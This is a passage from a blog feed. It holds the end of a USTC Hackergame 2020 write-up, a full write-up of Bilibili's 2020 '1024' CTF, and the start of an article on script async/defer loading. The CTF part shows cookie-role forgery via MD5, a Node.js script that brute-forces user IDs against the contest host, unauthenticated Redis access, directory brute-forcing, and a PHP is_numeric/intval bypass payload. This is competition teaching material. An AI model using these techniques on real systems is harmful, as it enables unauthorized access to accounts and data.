是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.9/31.png\" width=\"1109\" height=\"135\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\">\n<div>USTC Hackergame 2020（中科大信安赛）write up</div>\n<div><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-11-06</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/1.png\" width=\"1901\" height=\"720\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/2.png\" width=\"830\" height=\"301\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/3.png\" width=\"751\" height=\"666\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/4.png\" width=\"1905\" height=\"853\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/5.png\" width=\"431\" height=\"731\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/6.png\" width=\"1899\" height=\"543\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/7.png\" width=\"1901\" height=\"538\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/8.png\" width=\"646\" height=\"46\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/9.png\" width=\"1897\" height=\"512\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/10.png\" width=\"1443\" height=\"870\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/11.png\" width=\"406\" height=\"168\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/12.png\" width=\"833\" height=\"573\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/13.png\" width=\"689\" height=\"145\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\">\n<div>Bilibili 2020「1024 程序员节」CTF Write Up</div>\n<div><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-10-25</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, 